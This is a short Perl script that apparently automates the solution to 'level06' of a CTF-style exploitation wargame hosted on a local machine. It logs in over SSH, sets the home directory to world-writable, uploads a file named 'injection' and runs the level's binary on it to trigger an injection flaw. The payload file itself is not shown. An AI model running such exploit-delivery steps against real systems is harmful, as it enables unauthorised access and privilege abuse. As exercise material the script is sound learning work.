#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level06";

$chmod = "ssh -qp $port $user\@$ip 'chmod 777 . && rm injection'";
print $green, $chmod, $reset, "\n";
system($chmod);

$scp2 = "scp -q -P $port ./injection $user\@$ip:~";
print $red, $scp2, $reset, "\n";
system($scp2);

$tool = "./$user injection";
print $green, $tool, $reset, "\n";
system("ssh -qp $port $user\@$ip '$tool'");
